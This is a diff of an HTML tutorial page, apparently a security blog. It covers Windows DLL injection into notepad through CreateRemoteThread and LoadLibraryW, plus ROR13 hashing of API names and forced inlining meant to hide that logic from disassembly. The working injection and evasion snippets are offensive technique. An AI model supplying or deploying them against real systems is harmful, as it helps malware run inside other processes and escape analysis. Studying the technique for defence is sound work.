@@ -111,8 +111,7 @@
 #include &lt;cstdio&gt;
 BOOL APIENTRY DllMain( HMODULE hModule,
                        DWORD  ul_reason_for_call,
-                       LPVOID lpReserved
-                     )
+                       LPVOID lpReserved )
 {
     switch (ul_reason_for_call)
     {
@@ -174,24 +173,25 @@ __forceinline DWORD whash(const wchar_t* string) { // hash unicode
 	DWORD h = 0;
 	while (*string) {
 		wchar_t c = *string;
-		if (c >= 'a' && c &lt;= 'z') {
+		if (c >= 'a' && c &lt;= 'z') { // convert to all upper case 
 			c -= 0x20;
 		};
 		h = ror13(h);
 		h += (DWORD)c;
-
 		string++;
 	}
-	//printf("%X\n", h);
+	//printf("%X\n", h);  // This line is for me to create the hash constant.
 	return h;
 }</code></pre>
           <p>
             The <span class="inline-highlight">__forceinline</span> to tell the
-            compiler to place this code directly below call the
-            <span class="inline-highlight">whash</span> function, so there will
-            be no <span class="inline-highlight">call instruction</span> to
-            <span class="inline-highlight">whash</span>. Hiding in ASM when
-            using hash functions multiple times.
+            compiler to place code in scope directly after reach this line
+            <span class="inline-highlight"
+              >DWORD h = whash(module_entry->BaseDllName.Buffer);</span
+            >, so there would be no
+            <span class="inline-highlight">call instruction</span> to
+            <span class="inline-highlight">whash</span>. Purpose is hide the
+            logic in ASM when using hash functions multiple times.
           </p>
           <div class="image-container">
             <img src="./img/forceinline.png" alt="" class="zoomImage" />
@@ -316,12 +316,33 @@ if (!p_WriteProcessMemory(handle_process, remote_buffer, dll_path, dll_size, NUL
 PTHREAD_START_ROUTINE execute_thread = (PTHREAD_START_ROUTINE)p_LoadLibraryW; // thread entry
 
 if (!execute_thread) return 1;
-// create thread inside target's process
-if (!p_CreateRemoteThread(handle_process, 0, NULL, execute_thread, remote_buffer, 0, NULL)) return 1;</code></pre>
+
+handle_thread = p_CreateRemoteThread(handle_process, 0, NULL, execute_thread, remote_buffer, 0, NULL);
+if (handle_thread) {
+	WaitForSingleObject(handle_thread, INFINITE);	
+	p_CloseHandle(handle_thread);
+}
+
+p_VirtualFreeEx(handle_process, remote_buffer, 0, MEM_RELEASE);
+p_CloseHandle(handle_process);</code></pre>
           <p>The result displayed as gif below</p>
           <div class="image-container">
             <img src="./img/result1.gif" alt="" class="zoomImage" />
           </div>
+          <p>
+            Check inside notepad process and we can see the dll was injected
+            successfully
+          </p>
+          <div class="image-container">
+            <img src="./img/result2.png" alt="" class="zoomImage" />
+          </div>
+          <p>
+            In summary, this technique is somewhat similar to shellcode
+            injection, both forcing a process to perform a task. However, it's
+            quite noisy, it requires an injector to inject into the target, and
+            of course, traces are left behind in the target process's memory,
+            including in the list of DLLs.
+          </p>
         </section>
       </article>
       <div id="modal" class="modal">
